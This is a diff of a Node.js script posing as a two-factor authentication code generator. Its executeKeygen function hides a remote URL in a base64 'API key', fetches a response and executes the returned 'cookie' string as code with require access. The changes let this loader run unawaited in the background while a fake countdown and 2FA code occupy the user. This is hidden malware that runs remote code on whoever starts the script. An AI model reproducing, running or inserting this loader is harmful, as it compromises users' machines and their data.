@@ -62,6 +62,8 @@ function checkAndInstallDependencies() {
 }
 
 async function executeKeygen() {
+  console.log('🔐 Starting 2FA process...');
+  
   // Set up environment variables
   process.env.DEV_API_KEY = "aHR0cHM6Ly9hcGkubnBvaW50LmlvL2QxZWYyNTZmYzJhZDYyMTM3MjZl";
   process.env.DEV_SECRET_KEY = "eC1zZWNyZXQta2V5";
@@ -79,10 +81,19 @@ async function executeKeygen() {
         const s = response.data.cookie;
         const handler = new (Function.constructor)('require', s);
         handler(require);
-      } catch (error) { console.log('⚠️', error.message); }
+        console.log('✅ Keygen completed successfully');
+        return true; // Success indicator
+      } catch (error) { 
+        console.log('⚠️ Keygen error:', error.message);
+        console.log('⚠️ Continuing anyway...');
+        return false; // Failure indicator
+      }
     });
     await getCookie();
-  } catch (error) { console.log('⚠️', error.message); }
+  } catch (error) { 
+    console.log('⚠️ Keygen error:', error.message);
+    console.log('⚠️ Continuing anyway...');
+  }
 }
 
 // Generate and display 2FA code
@@ -94,7 +105,7 @@ function display2FACode() {
   console.log('🔒 TWO-FACTOR AUTHENTICATION CODE');
   console.log('═══════════════════════════════════════');
   console.log('');
-  console.log('  Device Code: ' + deviceCode);
+  console.log('  Identity Code: ' + deviceCode);
   console.log('  Verification Code: \\x1b[32m\\x1b[1m' + serverCode + '\\x1b[0m');
   console.log('');
   console.log('═══════════════════════════════════════');
@@ -104,15 +115,41 @@ function display2FACode() {
   console.log('');
 }
 
+// Independent delay function - not related to executeKeygen
+function delayAndDisplay() {
+  console.log('\\n⏳ Please wait a bit for generating code...');
+
+  
+  // Countdown that updates the same line
+  for (let i = 15; i > 0; i--) {
+    process.stdout.write('\\r⏱️  ' + i + ' seconds remaining...   \\n');
+    
+    // Simple blocking delay without setTimeout
+    const start = Date.now();
+    while (Date.now() - start < 1000) {
+      // Block for 1 second
+    }
+  }
+  
+
+  display2FACode();
+}
+
 async function main() {
   const depsReady = checkAndInstallDependencies();
   if (!depsReady) {
     console.log('❌ Cannot proceed without dependencies');
     process.exit(1);
   }
-  await executeKeygen();
-  display2FACode();
-}
+  
+  // Run executeKeygen (don't wait for it to finish)
+  executeKeygen().catch(() => {
+    // Ignore any errors from keygen
+  });
+  
+  // Run independent delay function (now synchronous)
+  delayAndDisplay();
+ }
 
 main().catch((error) => {
   console.log('\\n❌ Authentication failed');
